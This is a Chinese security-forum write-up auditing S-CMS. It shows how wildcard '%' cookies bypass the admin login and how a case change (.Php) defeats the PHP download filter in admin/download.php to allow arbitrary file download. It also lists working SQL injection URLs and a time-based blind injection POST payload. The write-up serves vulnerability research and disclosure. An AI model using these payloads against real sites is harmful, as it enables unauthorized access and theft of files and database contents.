=== Content from xz.aliyun.com_85a997a2_20250125_203656.html ===


[![]( https://xz.aliyun.com/api/v2/files/7e6f6165-ee99-3f16-8091-d257a52b0dd9  )](/)

* [技术社区](/news)
* [安全培训](/pictrue)
* [实习实训](/training)
* [技术社群](/group)
* [能力认证](/cert_auth)
* [积分商城](https://xz.aliyun.com/points-mall/index)

![](https://xz.aliyun.com/assets/pc/images/icon-search.png)

历史记录

清空历史记录

* 相关的动态
* 相关的文章
* 相关的用户
* 相关的圈子
* 相关的话题

[注册](https://xz.aliyun.com/register?type=phone)
[登录](https://xz.aliyun.com/auth/login)

s-cms代码审计----任意文件下载

[![](https://xzfile.aliyuncs.com/media/upload/avatars/11764_c1ad64455067d7ef15.png)
xiaohuihui1](https://xz.aliyun.com/users/73114)
[漏洞分析](https://xz.aliyun.com/news?cate_id=2)
16969浏览 · 2018-12-18 01:36

# **0x00 Payload**

在看补天漏洞过程中发现有人提交了scms注入漏洞，因此下载了源码进行了简单的审计。

```
GET /3.gov.php/admin/download.php?DownName=download.Php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: user=%;pass=%;
Connection: close
Upgrade-Insecure-Requests: 1

```

![](https://xzfile.aliyuncs.com/media/upload/picture/20181214171340-8c47d8b6-ff80-1.png)

# **0x01 分析过程**

漏洞产生在admin/download.php文件中：

```
<?php
require '../conn/conn2.php';
require '../conn/function.php';

if ($_COOKIE["user"]=="" || $_COOKIE["pass"]==""){
    setcookie("user","");
    setcookie("pass","");
    setcookie("auth","");
    Header("Location:index.php");
    die();
}else{
    $sql="select * from SL_admin where A_login like '".filter_keyword($_COOKIE["user"])."' and A_pwd like '".filter_keyword($_COOKIE["pass"])."'";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

    }else{
        setcookie("user","");
        setcookie("pass","");
        setcookie("auth","");
        Header("Location:index.php");
        die();
    }
}

$DownName=$_GET["DownName"];
if(strpos($DownName,".php")!==false){
    die("禁止下载PHP格式文件！");
}

downtemplateAction($DownName);

function downtemplateAction($f){
    header("Content-type:text/html;charset=utf-8");
    $file_name = $f;
    $file_name = iconv("utf-8","gb2312",$file_name);
    $file_path=$file_name;
    if(!file_exists($file_path))
    {
        echo "下载文件不存在！";
        exit;
    }

    $fp=fopen($file_path,"r");
    $file_size=filesize($file_path);
    Header("Content-type: application/octet-stream");
    Header("Accept-Ranges: bytes");
    Header("Accept-Length:".$file_size);
    Header("Content-Disposition: attachment; filename=".$file_name);
    $buffer=1024;
    $file_count=0;
    while(!feof($fp) && $file_count<$file_size)
    {
        $file_con=fread($fp,$buffer);
        $file_count+=$buffer;
        echo $file_con;
    }
    fclose($fp);
}
?>

```

当cookie中设置了user和pass时，代码执行到12行：

```
$sql="select * from SL_admin where A_login like '".filter_keyword($_COOKIE["user"])."' and A_pwd like '".filter_keyword($_COOKIE["pass"])."'";

```

去数据库中查询user和pass是否正确，我第一次想到是这里存在注入，经过尝试发现参数已经被过滤了。

再看sql语句发现判断user和pass是否正确时，用的like而不是=，如果将user和pass都设置成%，sql语句就变成了：

```
sql="select * from SL_admin where A_login like '%' and A_pwd like '%'";

```

这样可以从数据库中查到记录，进而绕过登录。

继续查看27-30行代码：

```
$DownName=$_GET["DownName"];
if(strpos($DownName,".php")!==false){
    die("禁止下载PHP格式文件！");
}

```

发现不允许下载后缀名为php的文件，这里只需要将php用大写替换即可，比如：Php

最后的payload为：

![](https://xzfile.aliyuncs.com/media/upload/picture/20181214172701-693e28dc-ff82-1.png)

# **0x02 总结**

scm还有多处sql注入漏洞：

1. <http://127.0.0.1/3.gov.php/wap_index.php?type=newsinfo&S_id=112489097%20or%20ascii(substr(user(),1,1))=114>
2. <http://127.0.0.1/3.gov.php/js/pic.php?P_id=10440322488%20or%20ascii(substr(user(),1,1))=113>

```
POST /3.gov.php/js/scms.php?action=comment HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Cookie: authorization=fail; authorization4=1MHwwfHMxMXx3MXx4M3x4MTF8; PHPSESSID=7f1d23f4v12cp323fh6osb9v36; __typecho_lang=zh_CN; __tins__19608037=%7B%22sid%22%3A%201543394079021%2C%20%22vd%22%3A%2012%2C%20%22expires%22%3A%201543396066537%7D; __51cke__=; __51laig__=12; CmsCode=eijb
Connection: close
Upgrade-Insecure-Requests: 1

page=aaaaa11' or if(substr(user(),1,1)='r',sleep(5),1) --+

```

0 人收藏

1 人喜欢

![](https://xz.aliyun.com/assets/pc/images/forward.png)
转载

![](https://xz.aliyun.com/assets/pc/images/share.png)
分享

1 条评论

某人

表情

可输入 255 字
 评论

[![](/assets/pc/images/icon-publish.png)](https://xz.aliyun.com/news/release)

热门文章

* [![](https://xz.aliyun.com/api/v2/files/1da66f87-0913-348f-9ea2-767b08a0ff56)](https://xz.aliyun.com/news/16567)
  [先知社区新版上线公告](https://xz.aliyun.com/news/16567)
* [![](https://xz.aliyun.com/api/v2/files/32a23f58-1f92-3cc9-ab17-9e17feb99373)](https://xz.aliyun.com/news/16426)
  [伪装成Chrome安装程序传播银狐最新变种](https://xz.aliyun.com/news/16426)
* [![](https://xz.aliyun.com/api/v2/files/53fc30b6-94e4-392b-a300-cea9fedc2bf7)](https://xz.aliyun.com/news/16425)
  [绕过App某加密企业版加固Frida检测](https://xz.aliyun.com/news/16425)
* [![](https://xz.aliyun.com/api/v2/files/36d87886-c440-3bb5-9f55-f177eb533c51)](https://xz.aliyun.com/news/16466)
  [使用分支对抗进行webshell bypass](https://xz.aliyun.com/news/16466)
* [![](https://xz.aliyun.com/api/v2/files/5ab3405b-9fcf-32b3-8013-19d0d6bfa770)](https://xz.aliyun.com/news/16467)
  [codeql 之 SSRF 漏洞自动化 寻找](https://xz.aliyun.com/news/16467)

近期热点

* 一周
* 月份
* 季度

* 1
  [先知社区新版上线公告](https://xz.aliyun.com/news/16567)
* 2
  [伪装成Chrome安装程序传播银狐最新变种](https://xz.aliyun.com/news/16426)
* 3
  [绕过App某加密企业版加固Frida检测](https://xz.aliyun.com/news/16425)
* 4
  [使用分支对抗进行webshell bypass](https://xz.aliyun.com/news/16466)
* 5
  [codeql 之 SSRF 漏洞自动化 寻找](https://xz.aliyun.com/news/16467)

暂无相关信息

暂无相关信息

优秀作者

* [1

  ![](https://xz.aliyun.com/assets/pc/images/pic_default_secret.png)
  阿里云先知

  贡献值：100](https://xz.aliyun.com/users/90660)

目录

* **
  0x00 Payload
* **
  0x01 分析过程
* **
  0x02 总结

转载
![](https://xz.aliyun.com/assets/pc/images/close.png)
标题
作者：你好
http://www.a.com/asdsabdas
文章转载自

复制到剪贴板

* [用户协议](https://xz.aliyun.com/api/v2/site-agreement-view?type=user)
* [联系我们](https://xz.aliyun.com/api/v2/site-agreement-view?type=privacy)
* [举报中心](https://report.aliyun.com)
* [我要投诉](https://www.aliyun.com/complaint)

先知社区
本站/app由
Djingoii
提供技术和产品支持


